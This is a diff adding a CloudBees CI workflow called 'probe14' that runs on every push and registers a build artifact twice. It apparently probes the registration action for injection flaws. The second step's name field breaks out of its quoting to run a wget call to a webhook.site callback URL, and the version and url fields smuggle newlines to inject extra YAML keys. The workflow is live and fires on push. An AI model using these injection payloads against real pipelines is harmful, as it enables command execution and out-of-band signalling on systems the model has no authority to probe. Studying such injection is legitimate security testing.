@@ -1,0 +1,26 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe14
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  art:
+    steps:
+      - name: register-plain
+        uses: cloudbees-io/register-build-artifact@v1
+        with:
+          name: probe-art
+          version: "1.0.0"
+          url: docker.io/library/alpine:3.20
+          type: docker
+      - name: register-inject
+        uses: cloudbees-io/register-build-artifact@v1
+        with:
+          name: "probe-inj\"; wget -q -O- http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/name-inj; echo \""
+          version: "9.9.9\n  injected-key: injected-value\n"
+          url: "docker.io/library/alpine:3.20\n  another: x"
+          type: docker
